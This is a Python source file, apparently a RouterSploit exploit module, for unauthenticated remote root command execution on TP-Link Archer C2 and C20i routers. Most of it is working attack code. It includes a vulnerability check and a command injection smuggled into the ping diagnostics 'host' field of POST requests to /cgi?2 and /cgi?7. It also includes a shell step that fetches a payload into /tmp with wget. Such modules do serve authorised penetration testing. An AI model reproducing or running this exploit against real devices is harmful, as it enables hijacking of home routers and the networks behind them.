import time
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "TP-Link Archer C2 & C20i",
        "description": "Exploits TP-Link Archer C2 and Archer C20i remote code execution vulnerability "
                       "that allows executing commands on operating system level with root privileges.",
        "authors": (
            "Michal Sajdak <michal.sajdak[at]securitum.pl",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "http://sekurak.pl/tp-link-root-bez-uwierzytelnienia-urzadzenia-archer-c20i-oraz-c2/",  # only in polish
        ),
        "devices": (
            "TP-Link Archer C2",
            "TP-Link Archer C20i",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command shell")
            print_status("It is blind command injection so response is not available")

            # requires testing
            shell(self, architecture="mipsbe", method="wget", location="/tmp")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        referer = "{}/mainFrame.htm".format(self.target)

        headers = {
            "Content-Type": "text/plain",
            "Referer": referer
        }

        data = ("[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
                "dataBlockSize=64\r\n"
                "timeout=1\r\n"
                "numberOfRepetitions=1\r\n"
                "host=127.0.0.1;" + cmd + ";\r\n"
                "X_TP_ConnName=ewan_ipoe_s\r\n"
                "diagnosticsState=Requested\r\n")

        # send command
        self.http_request(
            method="POST",
            path="/cgi?2",
            headers=headers,
            data=data
        )

        data = ("[ACT_OP_IPPING#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n")

        # execute command on device
        self.http_request(
            method="POST",
            path="/cgi?7",
            headers=headers,
            data=data
        )
        time.sleep(1)

        return ""

    @mute
    def check(self):
        referer = self.get_target_url(path="/mainFrame.htm")
        headers = {
            "Content-Type": "text/plain",
            "Referer": referer
        }

        data = (
            "[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6\r\n"
            "dataBlockSize=64\r\n"
            "timeout=1\r\n"
            "numberOfRepetitions=1\r\n"
            "host=127.0.0.1\r\n"
            "X_TP_ConnName=ewan_ipoe_s\r\n"
            "diagnosticsState=Requested\r\n"
        )

        response = self.http_request(
            method="POST",
            path="/cgi?2",
            headers=headers,
            data=data
        )
        if response is None:
            return False  # target is not vulnerable

        if response.status_code == 200 and "[error]0" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable
